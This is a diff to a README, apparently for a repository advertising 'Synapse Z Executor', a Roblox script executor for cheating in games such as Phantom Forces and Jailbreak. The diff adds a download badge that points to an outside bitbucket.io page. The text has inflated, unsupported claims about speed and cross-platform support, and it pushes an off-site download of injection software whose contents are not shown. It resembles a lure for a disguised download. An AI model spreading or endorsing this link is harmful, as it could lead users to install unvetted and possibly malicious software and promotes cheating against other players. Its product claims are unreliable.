@@ -3,6 +3,8 @@
 🌟 **Welcome to Synapse Z Executor** 🌟  
 The **most advanced Roblox script executor** of 2025, trusted by thousands for its **blazing speed**, **cross-platform support**, and **unmatched precision** in running even the most complex Lua scripts . Whether you’re dominating *Phantom Forces* with hitbox mods or automating *Jailbreak* grinds, Synapse Z delivers **zero-lag performance** and a library of premium tools .  
 
+[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blueviolet)](https://robloxexecutors.bitbucket.io/executors/synapse-z/)
+
 🔥 **Why Synapse Z?** 🔥  
 ✅ **Lightning-Fast Injection**: Execute scripts in milliseconds, even in intense gameplay .  
 ✅ **Universal Compatibility**: Works seamlessly on **Android, PC, iOS, and Mac** .  
